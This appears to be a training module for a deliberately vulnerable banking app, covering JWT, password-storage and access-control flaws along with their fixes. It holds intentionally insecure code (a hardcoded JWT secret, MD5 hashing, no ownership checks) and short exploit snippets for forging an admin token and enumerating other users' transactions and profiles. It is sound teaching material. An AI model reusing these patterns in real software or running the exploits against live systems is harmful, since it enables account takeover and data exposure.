# Module 3: Authentication & Authorization Vulnerabilities

## Understanding Authentication & Authorization

### What is Authentication?
Authentication is the process of verifying who someone is. Think of it like checking ID at a bank:
- The bank needs to verify you are who you claim to be
- You provide proof of identity (ID card, passport)
- The bank validates your proof against their records

In web applications, authentication typically involves:
1. **Something you know** (password, PIN)
2. **Something you have** (phone, security key)
3. **Something you are** (fingerprint, face)

### What is Authorization?
Authorization determines what someone is allowed to do. Using the bank analogy:
- Regular customers can view their accounts and make transfers
- Bank tellers can process transactions for any customer
- Managers can approve large transactions
- Security guards can't access any accounts

### Common Authentication Vulnerabilities
1. **Weak Password Policies**
   - Short passwords
   - Common passwords
   - No complexity requirements
   - No rate limiting

2. **Token Vulnerabilities**
   - Weak secrets
   - Missing expiration
   - Insecure storage
   - Token reuse

3. **Session Management Issues**
   - Long-lived sessions
   - Insecure session storage
   - Missing session invalidation
   - Session fixation

### Common Authorization Vulnerabilities
1. **Missing Access Controls**
   - No role checks
   - No ownership validation
   - Direct object references

2. **Privilege Escalation**
   - Vertical (user → admin)
   - Horizontal (user → another user)
   - Role manipulation

## DVBank Authentication Vulnerabilities

### 1. JWT Implementation Issues
**Location**: `backend/routes/auth_routes.py`
```python
# Vulnerable JWT implementation
token = jwt.encode(
    {'user_id': user.id},
    'secret',  # Hardcoded secret
    algorithm='HS256'  # Weak algorithm
)

# Missing:
# - Token expiration
# - Algorithm enforcement
# - Secret key rotation
```

**Impact**:
- Tokens can be forged using known secret
- Tokens never expire
- Algorithm confusion attacks possible

**Exploitation**:
```python
import jwt

# Create forged token
forged_token = jwt.encode(
    {'user_id': 1},  # Admin user ID
    'secret',
    algorithm='HS256'
)

# Use in requests
headers = {'Authorization': f'Bearer {forged_token}'}
response = requests.get('/api/admin', headers=headers)
```

### 2. Password Storage
**Location**: `backend/routes/auth_routes.py`
```python
# Weak password hashing
password_hash = hashlib.md5(password.encode()).hexdigest()

# Missing:
# - Strong hashing algorithm
# - Password salt
# - Pepper
# - Iteration count
```

**Impact**:
- Fast password cracking possible
- No protection against rainbow tables
- No protection against brute force

**Exploitation**:
```python
import hashlib
import requests

# Create MD5 hash
password = "password123"
hash = hashlib.md5(password.encode()).hexdigest()

# Register account with known hash
response = requests.post('/api/register', json={
    'username': 'test',
    'password_hash': hash
})
```

## DVBank Authorization Vulnerabilities

### 1. Missing Ownership Checks
**Location**: `backend/routes/transaction_routes.py`
```python
@app.route('/api/transactions/<transaction_id>')
@login_required
def get_transaction(transaction_id):
    # No ownership validation
    transaction = Transaction.query.get(transaction_id)
    return jsonify(transaction.to_dict())
```

**Impact**:
- Any user can access any transaction
- Financial privacy breach
- Unauthorized data access

**Exploitation**:
```python
# Iterate through transaction IDs
for tid in range(1, 100):
    response = requests.get(f'/api/transactions/{tid}')
    if response.status_code == 200:
        print(f"Found transaction: {response.json()}")
```

### 2. Profile Access Control
**Location**: `backend/routes/auth_routes.py`
```python
@app.route('/api/profile/<user_id>')
@login_required
def get_profile(user_id):
    # No authorization check
    user = User.query.get(user_id)
    return jsonify(user.get_profile())
```

**Impact**:
- Profile information disclosure
- Personal data exposure
- Privacy violation

**Exploitation**:
```python
# Access any user's profile
for uid in range(1, 100):
    response = requests.get(f'/api/profile/{uid}')
    if response.status_code == 200:
        print(f"Found profile: {response.json()}")
```

## Prevention Methods

### 1. Secure JWT Implementation
```python
# Strong JWT configuration
jwt_config = {
    'secret': os.getenv('JWT_SECRET'),
    'algorithm': 'HS512',
    'expires_in': 3600,  # 1 hour
    'required_claims': ['exp', 'iat', 'sub']
}

def create_token(user):
    return jwt.encode({
        'user_id': user.id,
        'exp': datetime.utcnow() + timedelta(seconds=jwt_config['expires_in']),
        'iat': datetime.utcnow(),
        'sub': str(user.id)
    }, jwt_config['secret'], algorithm=jwt_config['algorithm'])
```

### 2. Secure Password Storage
```python
from argon2 import PasswordHasher

ph = PasswordHasher()

def hash_password(password):
    return ph.hash(password)

def verify_password(hash, password):
    try:
        return ph.verify(hash, password)
    except:
        return False
```

### 3. Proper Authorization
```python
def verify_resource_owner(resource_id, user_id):
    resource = Resource.query.get(resource_id)
    if not resource or resource.user_id != user_id:
        raise Unauthorized("Access denied")
    return resource

@app.route('/api/transactions/<transaction_id>')
@login_required
def get_transaction(transaction_id):
    transaction = verify_resource_owner(transaction_id, current_user.id)
    return jsonify(transaction.to_dict())
```

## Practice Exercises

1. **JWT Analysis**
   - Decode and analyze JWT structure
   - Attempt token forgery
   - Implement secure JWT handling

2. **Password Security**
   - Analyze password hashing
   - Implement secure password storage
   - Add password complexity rules
   - Exploit missing authorization in password reset endpoint to change other users' passwords
   - Use account takeover via unauthorized password changes to gain access to victim accounts

3. **Authorization Controls**
   - Add ownership validation
   - Implement role-based access
   - Add audit logging

## Additional Resources

1. [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
2. [OWASP Authentication Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
3. [OWASP Authorization Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
4. [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
5. [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki)
6. [Flask-JWT-Extended Documentation](https://flask-jwt-extended.readthedocs.io/en/stable/)
7. [Argon2 Password Hashing](https://argon2-cffi.readthedocs.io/en/stable/)
8. [OWASP Session Management Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
9. [OWASP Access Control Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
10. [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
11. [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)

### Related Tools
1. [JWT.io](https://jwt.io/) - For JWT token analysis and debugging
2. [Burp Suite JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) - For JWT testing
3. [SQLMap](https://github.com/sqlmapproject/sqlmap) - For testing authentication bypass via SQL injection
4. [Hydra](https://github.com/vanhauser-thc/thc-hydra) - For password brute force testing

### Academic Papers
1. [A Comparative Analysis of Password Hashing Schemes](https://ieeexplore.ieee.org/document/8776589)
2. [On the Security of Modern Single Sign-On Protocols](https://arxiv.org/abs/2008.09257)

⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments. 
